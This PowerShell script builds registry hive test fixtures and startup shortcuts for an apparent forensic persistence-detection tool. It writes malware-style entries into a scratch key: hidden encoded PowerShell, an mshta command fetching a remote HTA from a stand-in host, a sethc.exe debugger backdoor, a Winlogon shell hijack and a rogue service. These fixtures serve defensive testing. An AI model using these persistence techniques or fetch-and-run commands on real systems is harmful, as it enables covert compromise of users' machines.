# Makes the test files in tests/data/registry: hives with our own keys, shaped like Windows' SOFTWARE,
# SYSTEM and a user's NTUSER.DAT, with startup entries malware would make, saved with reg save.
# Run in Windows as an administrator, with a USB stick as T: (the hives go to T:\hives). Kept with a
# UTF-8 BOM: without one, Windows PowerShell reads it as ANSI and the names that aren't ASCII break.
$ErrorActionPreference = 'Stop'
$base = 'HKCU:\Software\DFTest'
if (Test-Path $base) { Remove-Item $base -Recurse -Force }
# New-Item -Force would empty a key that's there already.
function Key($path) { if (-not (Test-Path "$base\$path")) { New-Item -Path "$base\$path" -Force | Out-Null }; "$base\$path" }
function Val($path, $name, $type, $value) { $k = Key $path; New-ItemProperty -Path $k -Name $name -PropertyType $type -Value $value -Force | Out-Null }

# SOFTWARE
$run = 'Software\Microsoft\Windows\CurrentVersion\Run'
Val $run 'SecurityHealth' ExpandString '%windir%\system32\SecurityHealthSystray.exe'
Val $run 'Updater' String 'C:\Users\tester\AppData\Local\Temp\xkqzvbnw.exe'
Val $run 'Helper' String 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA='
Val $run 'Gone' String '"C:\Program Files\Gone App\gone.exe" /tray'
Val 'Software\Microsoft\Windows\CurrentVersion\RunOnce' 'Cleanup' String 'cmd /c del C:\Temp\x.txt'
Val 'Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run' 'OldApp' String '"C:\Program Files (x86)\Old App\old.exe" -tray'
$wl = 'Software\Microsoft\Windows NT\CurrentVersion\Winlogon'
Val $wl 'Shell' String 'explorer.exe, C:\ProgramData\svc\host.exe'
Val $wl 'Userinit' String 'C:\Windows\system32\userinit.exe,'
Val 'Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' 'Debugger' String 'C:\Windows\System32\cmd.exe'
Val 'Software\Microsoft\Windows NT\CurrentVersion\Windows' 'AppInit_DLLs' String ''
Val 'Software\Microsoft\Windows NT\CurrentVersion\Windows' 'LoadAppInit_DLLs' DWord 0
Val 'Software\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-1-2-3-1001' 'ProfileImagePath' ExpandString 'C:\Users\tester'
# What the reader itself must cope with: a big value (stored in pieces), a key with so many
# subkeys that Windows indexes them in two levels, names that aren't ASCII, every value type.
Val 'Software\DFTest' 'Big' Binary ([byte[]](0..39999 | ForEach-Object { $_ % 251 }))
Val 'Software\DFTest' 'Multi' MultiString @('first', 'second', 'third')
Val 'Software\DFTest' 'Quad' QWord 81985529216486895
Val 'Software\DFTest' 'Number' DWord 305419896
Val 'Software\DFTest' 'Wert ä' String 'Grüße, ключ'
Val 'Software\DFTest\Ünïcode ключ' 'x' String 'y'
Set-Item -Path (Key 'Software\DFTest\Default') -Value 'the default value'
$many = Key 'Software\DFTest\Many'
for ($i = 0; $i -lt 1500; $i++) { New-Item -Path ("$many\Key{0:D4}" -f $i) -Force | Out-Null }

# SYSTEM
Val 'System\Select' 'Current' DWord 1
$svc = 'System\ControlSet001\Services'
Val "$svc\EvilSvc" 'ImagePath' ExpandString 'C:\Users\Public\svc.exe'
Val "$svc\EvilSvc" 'Start' DWord 2
Val "$svc\EvilSvc" 'Type' DWord 16
Val "$svc\EvilSvc" 'DisplayName' String 'Windows Update Helper'
Val "$svc\GoodSvc" 'ImagePath' ExpandString '%SystemRoot%\System32\svchost.exe -k netsvcs -p'
Val "$svc\GoodSvc" 'Start' DWord 2
Val "$svc\GoodSvc" 'Type' DWord 32
Val "$svc\GoodSvc\Parameters" 'ServiceDll' ExpandString '%SystemRoot%\System32\goodsvc.dll'
Val "$svc\Drv" 'ImagePath' ExpandString '\SystemRoot\System32\drivers\drv.sys'
Val "$svc\Drv" 'Start' DWord 1
Val "$svc\Drv" 'Type' DWord 1
Val "$svc\Off" 'ImagePath' ExpandString 'C:\x\off.exe'
Val "$svc\Off" 'Start' DWord 4
Val "$svc\Off" 'Type' DWord 16
Val 'System\ControlSet001\Control\Session Manager' 'BootExecute' MultiString @('autocheck autochk *', 'evil.exe')
Val 'System\ControlSet001\Control\Lsa' 'Notification Packages' MultiString @('scecli', 'evilfilter')

# NTUSER.DAT
$urun = 'NtUser\Software\Microsoft\Windows\CurrentVersion\Run'
Val $urun 'Discord' String 'C:\Users\tester\AppData\Local\Discord\Update.exe --processStart Discord.exe'
Val $urun 'Zz' String 'mshta.exe http://example.invalid/x.hta'
Val 'NtUser\Software\Microsoft\Windows NT\CurrentVersion\Windows' 'Load' String 'C:\Users\tester\AppData\Roaming\abc.exe'

$out = 'T:\hives'
if (Test-Path $out) { Remove-Item $out -Recurse -Force }
New-Item -ItemType Directory $out | Out-Null
foreach ($h in @('Software', 'System', 'NtUser')) {
    & reg.exe save "HKCU\Software\DFTest\$h" "$out\$($h.ToLower()).hiv" /y | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "reg save $h failed" }
}
Remove-Item $base -Recurse -Force

# Two shortcuts for the startup folder tests: one to a script in Temp with arguments, one to a
# program by an environment variable (Windows keeps that form in the shortcut too).
$shell = New-Object -ComObject WScript.Shell
New-Item -ItemType Directory -Force 'C:\Users\tester\AppData\Local\Temp\x9' | Out-Null
Set-Content 'C:\Users\tester\AppData\Local\Temp\x9\run.vbs' 'WScript.Echo 1'
$a = $shell.CreateShortcut("$out\helper.lnk")
$a.TargetPath = 'C:\Windows\System32\wscript.exe'
$a.Arguments = '//B "C:\Users\tester\AppData\Local\Temp\x9\run.vbs"'
$a.WorkingDirectory = 'C:\Users\tester\AppData\Local\Temp\x9'
$a.Save()
$b = $shell.CreateShortcut("$out\notes.lnk")
$b.TargetPath = '%windir%\notepad.exe'
$b.Save()
Remove-Item 'C:\Users\tester\AppData\Local\Temp\x9' -Recurse -Force
Get-ChildItem $out | Format-Table Name, Length -AutoSize
